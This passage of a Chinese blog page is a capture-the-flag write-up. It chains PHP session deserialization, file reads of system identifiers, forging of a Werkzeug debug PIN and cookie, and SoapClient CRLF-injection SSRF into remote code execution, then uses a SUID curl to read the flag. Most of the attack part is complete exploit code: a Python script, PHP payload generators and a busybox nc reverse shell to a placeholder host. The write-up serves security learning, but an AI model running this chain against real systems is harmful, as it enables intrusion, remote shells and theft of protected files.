+    <span class="n">cookie_name</span><span class="p">,</span> <span class="n">pin</span> <span class="o">=</span> <span class="nf">calc</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span><span class="n">private_bits</span><span class="p">)</span>
+    
+    <span class="n">cookie_value</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="nf">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">())</span><span class="si">}</span><span class="s">|</span><span class="si">{</span><span class="nf">hash_pin</span><span class="p">(</span><span class="n">pin</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span>
+    <span class="n">cookie</span> <span class="o">=</span> <span class="sh">"</span><span class="s">%s=%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">cookie_name</span><span class="p">,</span><span class="n">cookie_value</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] PIN : </span><span class="sh">"</span> <span class="o">+</span> <span class="n">pin</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Cookie : %s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">cookie</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">pin</span><span class="p">,</span> <span class="n">cookie</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">gen_pin_and_cookie</span><span class="p">(</span>
+        <span class="sh">'</span><span class="s">app</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sh">'</span><span class="s">/usr/lib/python3.8/site-packages/flask/app.py</span><span class="sh">'</span><span class="p">,</span> 
+        <span class="sh">'</span><span class="s">2485378023426</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>下一步就是就是利用 SoapClient 发送 python 反弹 shell 的代码, app 用户的默认 shell 为 ash, 考虑使用 busybox 反弹 shell, 反弹 shell 代码中, 空格, 引号, 等号需要进行 url 编码.</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">__import__(%22os%22).popen(%22/bin/busybox%20nc%20xxx.xxx.xxx.xxx%209999%20-e%20bash%22).read();</span><span class="sh">"</span>
+</code></pre></div></div>
+<p>SoapClient payload 生成脚本:</p>
+
+<p>soap_client.php</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$target</span><span class="o">=</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="nv">$post_string</span><span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$headers</span><span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+   <span class="s1">'X-Forwarded-For:127.0.0.1'</span><span class="p">,</span>
+   <span class="s1">'Cookie:'</span><span class="mf">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+   <span class="p">);</span>
+<span class="nv">$b</span><span class="o">=</span> <span class="k">new</span> <span class="nc">SoapClient</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">'location'</span><span class="o">=&gt;</span> <span class="nv">$target</span><span class="p">,</span><span class="s1">'user_agent'</span><span class="o">=&gt;</span><span class="s1">'wupco^^Content-Type:application/x-www-form-urlencoded^^'</span><span class="mf">.</span><span class="nb">join</span><span class="p">(</span><span class="s1">'^^'</span><span class="p">,</span><span class="nv">$headers</span><span class="p">)</span><span class="mf">.</span><span class="s1">'^^Content-Length:'</span><span class="mf">.</span><span class="p">(</span><span class="n">string</span><span class="p">)</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$post_string</span><span class="p">)</span><span class="mf">.</span><span class="s1">'^^^^'</span><span class="mf">.</span><span class="nv">$post_string</span><span class="p">,</span><span class="s1">'uri'</span><span class="o">=&gt;</span><span class="s2">"xxx"</span><span class="p">));</span>
+<span class="c1">//因为User-agent是可以控制的，因此可以利用crlf注入http头部发送post请求</span>
+<span class="nv">$aaa</span><span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+<span class="nv">$aaa</span><span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'^^'</span><span class="p">,</span><span class="s1">'%0d%0a'</span><span class="p">,</span><span class="nv">$aaa</span><span class="p">);</span>
+<span class="nv">$aaa</span><span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'&amp;'</span><span class="p">,</span><span class="s1">'%26'</span><span class="p">,</span><span class="nv">$aaa</span><span class="p">);</span>
+<span class="nv">$aaa</span><span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'%20'</span><span class="p">,</span><span class="s1">'%25%32%30'</span><span class="p">,</span><span class="nv">$aaa</span><span class="p">);</span>
+<span class="nv">$aaa</span><span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'%22'</span><span class="p">,</span><span class="s1">'%25%32%32'</span><span class="p">,</span><span class="nv">$aaa</span><span class="p">);</span>
+<span class="nv">$aaa</span><span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'%3D'</span><span class="p">,</span><span class="s1">'%25%33%44'</span><span class="p">,</span><span class="nv">$aaa</span><span class="p">);</span>
+<span class="c1">// echo $aaa,"\n";</span>
+
+<span class="c1">// $x= unserialize(urldecode($aaa));//调用__call方法触发网络请求发送</span>
+<span class="c1">// $x-&gt;no_func();</span>
+
+<span class="nv">$payload</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s2">"properties"</span> <span class="o">=&gt;</span> <span class="nv">$aaa</span>
+<span class="p">];</span>
+
+<span class="nv">$s</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$s</span><span class="p">,</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+</code></pre></div></div>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">$argv[1]</code> 为访问的 URL, 里面包含了上面反弹 shell 的 payload:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%22os%22).popen(%22/bin/busybox%20nc%20xxx.xxx.xxx.xxx%209999%20-e%20bash%22).read();&amp;frm=0&amp;s=MyOYC2KGBB42RX9ddF2N
+</code></pre></div>    </div>
+    <p>由于反序列化 SoapClient 前会进行 url 解码,为了保证 %20, %3D, %22 不被解码,需要单独对这三个字符进行二次 url 编码, 也就是脚本中三个 str_replace 的作用.</p>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">$argv[2]</code> 为上一步生成的 cookie 值.</li>
+</ol>
+
+<p>最终 exp 如下:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">re</span>
+<span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
+<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
+<span class="kn">from</span> <span class="n">gen_pin</span> <span class="kn">import</span> <span class="n">gen_pin_and_cookie</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://115.239.215.75:8081/index.php</span><span class="sh">'</span>
+
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">session</span><span class="p">()</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="sh">'</span><span class="s">helloworld</span><span class="sh">'</span>
+
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">http://192.168.137.98:8080</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">https</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">http://192.168.137.98:8080</span><span class="sh">"</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">session_request</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">files</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="p">(</span><span class="sh">'</span><span class="s">file</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="sh">'</span><span class="s">load.png</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span> <span class="sh">'</span><span class="s">image/png</span><span class="sh">'</span><span class="p">)),</span>
+    <span class="p">]</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sh">'</span><span class="s">PHP_SESSION_UPLOAD_PROGRESS</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">aaa</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sh">'</span><span class="s">data</span><span class="sh">'</span><span class="p">:</span> <span class="n">payload</span>
+        <span class="p">}</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span>
+        <span class="n">target</span><span class="p">,</span>
+        <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span>
+        <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span>
+        <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">PHPSESSID</span><span class="sh">'</span><span class="p">:</span> <span class="n">flag</span><span class="p">},</span>
+        <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span>
+    <span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">res</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] get file content fail</span><span class="sh">"</span><span class="p">)</span>
+    
+
+<span class="k">def</span> <span class="nf">get_file_content</span><span class="p">(</span><span class="n">file_name</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] get </span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s"> content</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">check_output</span><span class="p">([</span><span class="sh">'</span><span class="s">php</span><span class="sh">'</span><span class="p">,</span> <span class="sh">"</span><span class="s">./get_file_content.php</span><span class="sh">"</span><span class="p">,</span> <span class="n">file_name</span><span class="p">],</span> <span class="n">universal_newlines</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">payload</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="nf">session_request</span><span class="p">(</span><span class="n">payload</span><span class="p">).</span><span class="n">text</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">file_content</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">this is the object: </span><span class="sh">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s"> &lt;br&gt;</span><span class="sh">'</span><span class="p">,</span><span class="sh">''</span><span class="p">)</span>
+        <span class="n">file_content</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">file_content</span><span class="p">).</span><span class="nf">decode</span><span class="p">()</span>
+        
+        <span class="nf">print</span><span class="p">(</span><span class="n">file_content</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">file_content</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] file not found</span><span class="sh">"</span><span class="p">)</span>
+
+
+
+<span class="k">def</span> <span class="nf">file_get_content_request</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">check_output</span><span class="p">([</span><span class="sh">'</span><span class="s">php</span><span class="sh">'</span><span class="p">,</span> <span class="sh">"</span><span class="s">./console_interact.php</span><span class="sh">"</span><span class="p">,</span> <span class="n">url</span><span class="p">],</span> <span class="n">universal_newlines</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    
+    <span class="n">res</span> <span class="o">=</span> <span class="nf">session_request</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">get_secret</span><span class="p">():</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="nf">file_get_content_request</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">console</span><span class="sh">'</span><span class="p">).</span><span class="n">text</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">secret</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sh">"</span><span class="s">[0-9a-zA-Z]{20}</span><span class="sh">"</span><span class="p">,</span><span class="n">res</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] get secret </span><span class="si">{</span><span class="n">secret</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] get secret fail</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">secret</span>
+
+<span class="k">def</span> <span class="nf">soap_request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cookie</span><span class="o">=</span><span class="sh">""</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">check_output</span><span class="p">([</span><span class="sh">'</span><span class="s">php</span><span class="sh">'</span><span class="p">,</span> <span class="sh">"</span><span class="s">./soap_client.php</span><span class="sh">"</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">cookie</span><span class="p">],</span> <span class="n">universal_newlines</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">payload</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="nf">session_request</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">get_uuid_mechine_id</span><span class="p">():</span>
+    <span class="n">uuid</span> <span class="o">=</span> <span class="nf">get_file_content</span><span class="p">(</span><span class="sh">"</span><span class="s">/sys/class/net/eth0/address</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">uuid</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">),</span> <span class="mi">16</span><span class="p">))</span>
+    <span class="n">mechine_id</span> <span class="o">=</span> <span class="nf">get_file_content</span><span class="p">(</span><span class="sh">"</span><span class="s">/proc/sys/kernel/random/boot_id</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">mechine_id</span> <span class="o">+=</span> <span class="nf">get_file_content</span><span class="p">(</span><span class="sh">"</span><span class="s">/proc/self/cgroup</span><span class="sh">"</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] uuid </span><span class="si">{</span><span class="n">uuid</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] mechine_id </span><span class="si">{</span><span class="n">mechine_id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">uuid</span><span class="p">,</span> <span class="n">mechine_id</span>
+
+<span class="k">def</span> <span class="nf">reverse_shell</span><span class="p">(</span><span class="n">secret</span><span class="p">,</span><span class="n">cookie</span><span class="p">,</span> <span class="n">rev_host</span><span class="p">,</span> <span class="n">rev_port</span><span class="p">):</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">__import__(%22os%22).popen(%22/bin/busybox%20nc%20</span><span class="si">{</span><span class="n">rev_host</span><span class="si">}</span><span class="s">%20</span><span class="si">{</span><span class="n">rev_port</span><span class="si">}</span><span class="s">%20-e%20bash%22).read();</span><span class="sh">"</span>
+    <span class="nf">soap_request</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s">&amp;frm=0&amp;s=</span><span class="si">{</span><span class="n">secret</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span><span class="n">cookie</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="c1"># while True:
+</span>    <span class="c1">#     file = input("filename&gt; ")
+</span>    <span class="c1">#     get_file_content(file)
+</span>    <span class="c1"># target = 'http://192.168.137.131:28999/index.php'
+</span>    <span class="n">secret</span> <span class="o">=</span> <span class="nf">get_secret</span><span class="p">()</span>
+
+    <span class="n">uuid</span><span class="p">,</span> <span class="n">mechine_id</span> <span class="o">=</span> <span class="nf">get_uuid_mechine_id</span><span class="p">()</span>
+
+    <span class="n">_</span><span class="p">,</span><span class="n">cookie</span> <span class="o">=</span> <span class="nf">gen_pin_and_cookie</span><span class="p">(</span>
+        <span class="sh">'</span><span class="s">app</span><span class="sh">'</span><span class="p">,</span>
+        <span class="sh">'</span><span class="s">/usr/lib/python3.8/site-packages/flask/app.py</span><span class="sh">'</span><span class="p">,</span> 
+        <span class="n">uuid</span><span class="p">,</span> <span class="n">mechine_id</span><span class="p">)</span>
+    <span class="nf">reverse_shell</span><span class="p">(</span><span class="n">secret</span><span class="p">,</span><span class="n">cookie</span><span class="p">,</span> <span class="sh">"</span><span class="s">xxx.xxx.xxx.xxx</span><span class="sh">"</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>其中用到了两个 php 脚本, 一个是上面的 soap_client.php , 另一个是 get_file_content.php 用于读取文件.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="nv">$payload</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s2">"properties"</span> <span class="o">=&gt;</span> <span class="p">[</span>
+        <span class="s2">"php://filter/convert.base64-encode/resource="</span><span class="mf">.</span><span class="nv">$filename</span><span class="p">,</span>
+        <span class="s2">"r"</span>
+    <span class="p">],</span>
+    <span class="s2">"_SESSION"</span> <span class="o">=&gt;</span> <span class="p">[</span>
+        <span class="s2">"type"</span> <span class="o">=&gt;</span> <span class="s2">"SplFileObject"</span>
+    <span class="p">],</span>
+    <span class="s2">"type"</span> <span class="o">=&gt;</span> <span class="s2">"SplFileObject"</span>
+<span class="p">];</span>
+<span class="nv">$s</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$s</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>获取 shell 之后发现没有权限读取 /flag 文件, 且当前用户 app 为普通用户. 考虑提权信息收集, 查找 SUID 文件时发现 curl 拥有权限.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-path</span> /proc <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-path</span> /sys <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-path</span> /dev <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f <span class="nt">-print</span> 2&gt;/dev/null
+/usr/bin/passwd
+/usr/bin/curl
+/usr/bin/gpasswd
+/usr/bin/expiry
+/usr/bin/chfn
+/usr/bin/chage
+/usr/bin/chsh
+/usr/sbin/suexec
+</code></pre></div></div>
+
+<p>curl 使用 file 协议读取文件:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl file:///flag
+SCTF{i_have_n0_t1me!GGGGGGGGG}
+</code></pre></div></div>
+
+<h2 id="参考-1">参考</h2>
+<ul>
+  <li><a href="https://vk.com/@greyteam-rce-flask-werkzeug-generiruem-kuku-na-osnove-pin-koda">(RCE) Flask + Werkzeug генерируем куку на основе PIN кода</a></li>
+</ul>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2023-06-20T13:34:21+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/python/2023/06/15/Werkzeug-debug-%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.html">Werkzeug debug 安全问题</a></div><div class="next"><span>NEXT</span><a href="/php/2023/06/21/php-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.html">php 原生类利用</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
+</script>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
+</div>
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="DumKiy"><meta itemprop="url" content="/"><meta itemprop="description" content="Watch And Learn."><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
+</svg>
+</div>
+        </a>
+      </li></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© DumKiy's blog 2021,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
+        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
+      </div>
+    </div>
+  </div>
+</footer>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
